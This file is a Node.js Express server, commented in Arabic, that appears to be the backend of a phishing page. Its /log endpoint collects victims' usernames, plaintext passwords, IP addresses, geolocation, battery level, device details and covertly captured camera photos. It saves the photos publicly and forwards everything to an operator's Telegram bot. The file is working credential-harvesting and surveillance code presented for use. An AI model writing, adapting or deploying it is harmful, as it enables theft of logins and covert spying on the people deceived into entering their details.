const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const fs = require("fs");
const path = require("path");
require("dotenv").config();

const app = express();
app.use(bodyParser.json({ limit: "15mb" }));
app.use(express.static("public"));

// 🔔 إشعار عند تشغيل الخادم
(async () => {
  try {
    await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
      chat_id: process.env.CHAT_ID,
      text: "🔔 الخادم يعمل الآن ✅"
    });
    console.log("✅ تم إرسال إشعار البدء إلى تيليجرام");
  } catch (err) {
    console.error("❌ فشل إرسال الإشعار:", err.response?.data || err.message);
  }
})();

// 📨 استقبال البيانات من العميل
app.post("/log", async (req, res) => {
  const data = req.body;

  console.log("📥 تم استلام البيانات:", data);

  const message = `
📡 تسجيل دخول جديد:

👤 المستخدم: ${data.username}
🔐 كلمة المرور: ${data.password}
🌐 IP: ${data.ip}
🔋 البطارية: ${data.battery || "غير متاحة"}%
🌍 الموقع: ${data.location || "غير متاح"}
🧠 الجهاز: ${data.userAgent}
  `;

  try {
    // 🖼️ حفظ الصورة باسم فريد
    let imageUrl = null;
    if (data.image && data.image.startsWith("data:image/")) {
      const base64Data = data.image.split(",")[1]; // ✅ الطريقة الآمنة والمباشرة
      const uniqueName = `cam_${Date.now()}_${Math.floor(Math.random() * 10000)}.jpg`;
      const filePath = path.join(__dirname, "public", uniqueName);
      fs.writeFileSync(filePath, base64Data, 'base64');
      imageUrl = `${process.env.BASE_URL}/${uniqueName}`;
    }

    // 📤 إرسال البيانات النصية
    await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
      chat_id: process.env.CHAT_ID,
      text: message
    });

    // 🖼️ إرسال الصورة إذا وُجدت
    if (imageUrl) {
      await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendPhoto`, {
        chat_id: process.env.CHAT_ID,
        photo: imageUrl,
        caption: "📸 صورة الكاميرا من المستخدم الجديد"
      });
    }

    res.sendStatus(200);
  } catch (error) {
    console.error("❌ فشل إرسال البيانات أو الصورة:", error.response?.data || error.message);
    res.sendStatus(500);
  }
});

// 🚀 تشغيل الخادم
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 الخادم يعمل على المنفذ ${PORT}`);
});